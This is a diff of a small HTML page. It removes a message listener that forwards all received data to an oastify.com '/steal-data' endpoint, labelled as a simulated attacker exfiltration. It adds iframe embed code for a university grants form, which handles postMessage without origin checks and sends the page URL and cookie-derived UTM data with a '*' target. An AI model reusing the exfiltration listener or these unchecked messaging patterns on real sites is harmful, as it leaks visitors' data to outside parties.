@@ -2,18 +2,100 @@
 <html lang="en">
 <body>
 <script>
-    window.addEventListener("message", receiveMessage, false);
+    // cuForm - конфигурация для настройки iframe
+    const cuForm = {
+        iframe: {
+            src: 'https://static.centraluniversity.ru/forms/grants/', // url откуда будет браться форма
+            id: 'cu-form-iframe', // id iframe в html-разметке
+        },
+        desctopWidth: '480', // ширина в пикселях, если надо всегда 100% - то заменить на null или 0
+        anchor: '#rec656988229', // якорь к которому, привязывается iframe
+    };
 
-    function receiveMessage(event){
-        if (event.data) {
-            console.log("Received data: ", event.data);
+    if (cuForm.desctopWidth) {
+        cuForm.iframe.src = `${cuForm.iframe.src}/?desctopWidth=${cuForm.desctopWidth}`;
+    }
 
-            // Simulating sending this data to attacker's server
-            fetch("http://owofkr92garqk8zt8b12nh5lvc13pudj.oastify.com/steal-data", {
-                method: "POST",
-                body: event.data
-            });
+    let myFrame = document.createElement('iframe');
+    for (const [key, value] of Object.entries(cuForm.iframe)) {
+        myFrame[key] = value;
+    }
+    document.querySelector(cuForm.anchor).appendChild(myFrame);
+
+    window.addEventListener(
+        'message',
+        function (event) {
+            if (typeof event.data !== 'string') {
+                return;
+            }
+
+            try {
+                let evdata = JSON.parse(event.data);
+                switch (evdata.type) {
+                    case 'analytics':
+                        console.log("Received data: ", evdata);
+                        break;
+                    case 'cu-rules-click':
+                        document.getElementById('cu-rules').onclick = function () {
+                            document.getElementById('cu-rules').style.display = 'none';
+                        };
+                        document.getElementById('cu-rules-close').onclick = function () {
+                            document.getElementById('cu-rules').style.display = 'none';
+                        };
+                        document.getElementById('cu-rules-content').onclick = function (e) {
+                            e.stopPropagation();
+                        };
+                        document.getElementById('cu-rules').style.display = 'flex';
+                        break;
+                    case 'cu-form-loaded':
+                        // @deprecated use parentData instread parentUrl
+                        sendPostMessage('parentUrl', window.location.href);
+
+                        sendPostMessage('parentData', {
+                            parentUrl: window.location.href,
+                            parentCookie: decodeURIComponent(parseTildaUtm()),
+                        });
+                        break;
+                }
+            } catch (e) {
+                return;
+            }
+        },
+        false,
+    );
+
+    function getCookieByName(name) {
+        const cookies = document.cookie.split(';').reduce((acc, cookieString) => {
+            const [key, value] = cookieString.split('=').map(s => s.trim());
+            if (key && value) {
+                acc[key] = decodeURIComponent(value);
+            }
+            return acc;
+        }, {});
+        return name ? cookies[name] || '' : null;
+    }
+
+    function sendPostMessage(type, data) {
+        let frame = document.getElementById('cu-form-iframe');
+
+        frame = frame ? frame.contentWindow : null;
+
+        if (frame) {
+            frame.postMessage(JSON.stringify({type, data}), '*');
         }
+    }
+
+    function parseTildaUtm() {
+        const tildaUtmCookieName = 'TILDAUTM';
+        const utmSeparator = '|||';
+
+        return getCookieByName(tildaUtmCookieName)
+            .split(utmSeparator)
+            .map(utmTag => utmTag?.split('#'))
+            .flat()
+            .filter(utmTag => Boolean(utmTag) && utmTag.startsWith('utm_'))
+            .join('&')
+            .replace(/%20/g, '+');
     }
 </script>
 </body>
